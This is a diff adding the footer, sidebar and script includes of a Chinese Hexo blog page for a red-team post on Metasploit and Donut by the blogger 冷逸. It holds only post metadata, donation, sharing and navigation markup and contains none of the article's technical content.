+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/rt/">RedTeam之使用msf+Donut交互式执行程序</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2019年12月31日 - 22:12</p>
+  <p><span>最后更新:</span>2019年12月31日 - 22:12</p>
+  <p><span>原始链接:</span><a href="/rt/" title="RedTeam之使用msf+Donut交互式执行程序">https://lengjibo.github.io/rt/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/rt/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/red-team/" rel="tag"><i class="fa fa-tag"></i> red team</a>
+          
+            <a href="/tags/msf/" rel="tag"><i class="fa fa-tag"></i> msf</a>
+          
+            <a href="/tags/dount/" rel="tag"><i class="fa fa-tag"></i> dount</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/SZ/" rel="next" title="记一次授权实战">
+                <i class="fa fa-chevron-left"></i> 记一次授权实战
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">69</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">15</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">103</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zfsec.cn/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
